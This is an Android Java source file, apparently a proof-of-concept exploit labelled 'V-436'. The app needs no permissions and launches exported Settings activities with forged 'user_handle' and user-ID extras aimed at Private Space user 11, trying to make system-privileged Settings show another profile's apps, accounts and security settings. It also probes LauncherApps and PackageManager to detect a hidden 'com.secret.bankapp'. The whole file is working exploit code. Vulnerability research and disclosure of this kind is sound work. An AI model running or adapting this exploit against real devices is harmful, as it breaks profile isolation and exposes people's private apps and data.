package com.poc.settingscrossuser;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.LauncherApps;
import android.content.pm.LauncherActivityInfo;
import android.net.Uri;
import android.os.Bundle;
import android.os.Process;
import android.os.UserHandle;
import android.util.Log;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.TextView;
import android.view.Gravity;

import java.lang.reflect.Method;

/**
 * V-436: Settings EXTRA_USER_HANDLE Cross-User Exploitation
 *
 * Settings runs as android.uid.system with INTERACT_ACROSS_USERS_FULL.
 * Many exported activities read "user_handle" (UserHandle Parcelable) from intent extras
 * to determine which user's settings to display/modify.
 *
 * A zero-permission app can launch these activities with user_handle pointing to
 * Private Space (user 11) or work profile (user 10), causing Settings to operate
 * on another user's data using its system-level cross-user permissions.
 */
public class MainActivity extends Activity {

    private static final String TAG = "SettingsCrossUser";
    private static final int PRIVATE_SPACE_USER_ID = 11;

    private TextView mOutput;
    private StringBuilder mLog = new StringBuilder();

    private static final String[][] SETTINGS_TARGETS = {
        {"android.settings.MANAGE_ALL_APPLICATIONS_SETTINGS", "App list"},
        {"android.settings.APPLICATION_SETTINGS", "App settings"},
        {"android.settings.WIFI_SETTINGS", "WiFi"},
        {"android.settings.BLUETOOTH_SETTINGS", "Bluetooth"},
        {"android.settings.SOUND_SETTINGS", "Sound"},
        {"android.settings.DISPLAY_SETTINGS", "Display"},
        {"android.settings.SECURITY_SETTINGS", "Security"},
        {"android.settings.LOCATION_SOURCE_SETTINGS", "Location"},
        {"android.settings.INTERNAL_STORAGE_SETTINGS", "Storage"},
        {"android.settings.ACCOUNT_SYNC_SETTINGS", "Accounts"},
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setPadding(32, 48, 32, 32);

        TextView title = new TextView(this);
        title.setText("V-436: Settings Cross-User via EXTRA_USER_HANDLE");
        title.setTextSize(16);
        title.setGravity(Gravity.CENTER);
        root.addView(title);

        TextView info = new TextView(this);
        info.setText("ZERO permissions. Launches Settings activities with user_handle="
                + PRIVATE_SPACE_USER_ID + " (Private Space). "
                + "Settings uses its system UID to operate on the target user.");
        info.setTextSize(11);
        info.setPadding(0, 16, 0, 16);
        root.addView(info);

        Button btn1 = new Button(this);
        btn1.setText("1. Launch App List for Private Space (user 11)");
        btn1.setOnClickListener(v -> launchForUser(
                "android.settings.MANAGE_ALL_APPLICATIONS_SETTINGS", PRIVATE_SPACE_USER_ID));
        root.addView(btn1);

        Button btn2 = new Button(this);
        btn2.setText("2. Launch Account Settings for user 11");
        btn2.setOnClickListener(v -> launchForUser(
                "android.settings.ACCOUNT_SYNC_SETTINGS", PRIVATE_SPACE_USER_ID));
        root.addView(btn2);

        Button btn3 = new Button(this);
        btn3.setText("3. Launch Security Settings for user 11");
        btn3.setOnClickListener(v -> launchForUser(
                "android.settings.SECURITY_SETTINGS", PRIVATE_SPACE_USER_ID));
        root.addView(btn3);

        Button btn4 = new Button(this);
        btn4.setText("4. Probe All Settings Actions (user 11)");
        btn4.setOnClickListener(v -> probeAllSettings());
        root.addView(btn4);

        Button btn5 = new Button(this);
        btn5.setText("5. Try intent.EXTRA_USER (alternative key)");
        btn5.setOnClickListener(v -> tryAlternativeKeys());
        root.addView(btn5);

        Button btn6 = new Button(this);
        btn6.setText("6. Open PS-only app details (com.secret.bankapp)");
        btn6.setOnClickListener(v -> openPsAppDetails());
        root.addView(btn6);

        ScrollView scroll = new ScrollView(this);
        mOutput = new TextView(this);
        mOutput.setTextSize(10);
        mOutput.setTypeface(android.graphics.Typeface.MONOSPACE);
        mOutput.setPadding(8, 8, 8, 8);
        scroll.addView(mOutput);
        root.addView(scroll, new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, 0, 1.0f));

        setContentView(root);

        log("=== V-436: Settings Cross-User PoC ===");
        log("Package: " + getPackageName());
        log("UID: " + Process.myUid());
        log("Target user: " + PRIVATE_SPACE_USER_ID + " (Private Space)");
        log("Permissions: NONE");
        log("");
        log("This PoC launches exported Settings activities with");
        log("user_handle extra set to Private Space userId.");
        log("If Settings shows PS user's data, the vuln is confirmed.");
        log("");

        // Attempt programmatic data extraction
        testDataExtraction();
    }

    private void testDataExtraction() {
        log("\n=== Programmatic Data Extraction Tests ===\n");

        // Test 1: LauncherApps.getActivityList for user 11
        try {
            LauncherApps la = (LauncherApps) getSystemService(LAUNCHER_APPS_SERVICE);
            UserHandle u11 = userHandleOf(PRIVATE_SPACE_USER_ID);
            java.util.List<LauncherActivityInfo> activities = la.getActivityList(null, u11);
            log("[LauncherApps.getActivityList(u11)] Got " + activities.size() + " activities:");
            for (LauncherActivityInfo info : activities) {
                log("  → " + info.getApplicationInfo().packageName + " | " + info.getLabel());
            }
        } catch (SecurityException e) {
            log("[LauncherApps] SecurityException: " + e.getMessage());
        } catch (Exception e) {
            log("[LauncherApps] " + e.getClass().getSimpleName() + ": " + e.getMessage());
        }

        // Test 2: LauncherApps.getProfiles
        try {
            LauncherApps la = (LauncherApps) getSystemService(LAUNCHER_APPS_SERVICE);
            java.util.List<android.os.UserHandle> profiles = la.getProfiles();
            log("[LauncherApps.getProfiles()] " + profiles.size() + " profiles:");
            for (android.os.UserHandle p : profiles) {
                log("  → " + p.toString());
            }
        } catch (Exception e) {
            log("[getProfiles] " + e.getClass().getSimpleName() + ": " + e.getMessage());
        }

        // Test 3: PackageManager.getInstalledApplications - check if bankapp visible
        try {
            java.util.List<android.content.pm.ApplicationInfo> apps =
                getPackageManager().getInstalledApplications(0);
            log("[PM.getInstalledApplications] Total visible: " + apps.size());
            boolean foundBank = false;
            for (android.content.pm.ApplicationInfo ai : apps) {
                if (ai.packageName.contains("bankapp") || ai.packageName.contains("secret")) {
                    log("  → FOUND PS APP: " + ai.packageName + " uid=" + ai.uid);
                    foundBank = true;
                }
            }
            if (!foundBank) log("  → com.secret.bankapp NOT visible (expected for cross-user)");
        } catch (Exception e) {
            log("[PM] " + e);
        }

        // Test 4: Try getPackageInfo for bankapp directly
        try {
            android.content.pm.PackageInfo pi = getPackageManager().getPackageInfo("com.secret.bankapp", 0);
            log("[PM.getPackageInfo(bankapp)] SUCCESS! version=" + pi.versionName);
        } catch (android.content.pm.PackageManager.NameNotFoundException e) {
            log("[PM.getPackageInfo(bankapp)] NameNotFound (not visible from user 0)");
        } catch (Exception e) {
            log("[PM.getPackageInfo] " + e);
        }

        log("\n=== End Data Extraction Tests ===\n");
    }

    private UserHandle userHandleOf(int userId) {
        try {
            Method of = UserHandle.class.getMethod("of", int.class);
            return (UserHandle) of.invoke(null, userId);
        } catch (Exception e) {
            log("[ERROR] Cannot create UserHandle: " + e.getMessage());
            return Process.myUserHandle();
        }
    }

    private void launchForUser(String action, int userId) {
        log("\n--- Launching: " + action + " for user " + userId + " ---");
        try {
            Intent intent = new Intent(action);
            UserHandle targetUser = userHandleOf(userId);

            // Method 1: "user_handle" key (used by SettingsActivity)
            intent.putExtra("user_handle", targetUser);

            // Method 2: also set android.intent.extra.USER (framework key)
            intent.putExtra(Intent.EXTRA_USER, targetUser);

            // Method 3: integer variant
            intent.putExtra("android.intent.extra.user_handle", userId);

            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

            startActivity(intent);
            log("[OK] Activity launched successfully");
            log("  → Check if Settings shows user " + userId + "'s data");
            log("  → If it does, cross-user access confirmed!");
        } catch (SecurityException e) {
            log("[BLOCKED] SecurityException: " + e.getMessage());
        } catch (Exception e) {
            log("[ERROR] " + e.getClass().getSimpleName() + ": " + e.getMessage());
        }
    }

    private void probeAllSettings() {
        log("\n=== Probing all Settings actions with user_handle=" + PRIVATE_SPACE_USER_ID + " ===\n");
        for (String[] target : SETTINGS_TARGETS) {
            String action = target[0];
            String label = target[1];
            try {
                Intent intent = new Intent(action);
                intent.putExtra("user_handle", userHandleOf(PRIVATE_SPACE_USER_ID));
                intent.putExtra(Intent.EXTRA_USER, userHandleOf(PRIVATE_SPACE_USER_ID));
                intent.putExtra("android.intent.extra.user_handle", PRIVATE_SPACE_USER_ID);
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(intent);
                log("[" + label + "] OK — launched for user " + PRIVATE_SPACE_USER_ID);
            } catch (SecurityException e) {
                log("[" + label + "] BLOCKED: " + e.getMessage());
            } catch (Exception e) {
                log("[" + label + "] ERROR: " + e.getMessage());
            }
        }
        log("\n[DONE] Check each Settings screen — does it show Private Space data?");
    }

    private void openPsAppDetails() {
        log("\n--- Opening app details for PS-only app (com.secret.bankapp) ---");
        log("This app is ONLY installed in Private Space (user 11).");
        log("If Settings shows its details, cross-user data access is confirmed.\n");
        try {
            Intent intent = new Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
            intent.setData(android.net.Uri.parse("package:com.secret.bankapp"));
            intent.putExtra("user_handle", userHandleOf(PRIVATE_SPACE_USER_ID));
            intent.putExtra(Intent.EXTRA_USER, userHandleOf(PRIVATE_SPACE_USER_ID));
            intent.putExtra("android.intent.extra.user_handle", PRIVATE_SPACE_USER_ID);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
            log("[OK] APPLICATION_DETAILS_SETTINGS launched for com.secret.bankapp");
            log("  → This package is NOT installed in user 0");
            log("  → If Settings shows app info, it accessed user 11's package data");
        } catch (SecurityException e) {
            log("[BLOCKED] SecurityException: " + e.getMessage());
        } catch (Exception e) {
            log("[ERROR] " + e.getClass().getSimpleName() + ": " + e.getMessage());
        }
    }

    private void tryAlternativeKeys() {
        log("\n--- Testing alternative extra keys ---");
        String action = "android.settings.MANAGE_ALL_APPLICATIONS_SETTINGS";
        UserHandle target = userHandleOf(PRIVATE_SPACE_USER_ID);

        String[] keys = {
            "user_handle",
            "android.intent.extra.USER",
            "android.intent.extra.user_handle",
            "userId",
            "profileId",
            "android.provider.extra.USER_ID",
        };

        for (String key : keys) {
            try {
                Intent intent = new Intent(action);
                if (key.contains("user_handle") && !key.contains("extra")) {
                    intent.putExtra(key, target);
                } else if (key.equals("android.intent.extra.USER")) {
                    intent.putExtra(key, target);
                } else {
                    intent.putExtra(key, PRIVATE_SPACE_USER_ID);
                }
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(intent);
                log("[KEY: " + key + "] Launched OK");
            } catch (Exception e) {
                log("[KEY: " + key + "] " + e.getClass().getSimpleName());
            }
        }
        log("\n[INFO] Monitor logcat for 'user_handle' warnings to see which keys are read");
    }

    private void log(String msg) {
        Log.d(TAG, msg);
        mLog.append(msg).append("\n");
        if (mOutput != null) {
            mOutput.setText(mLog.toString());
        }
    }
}
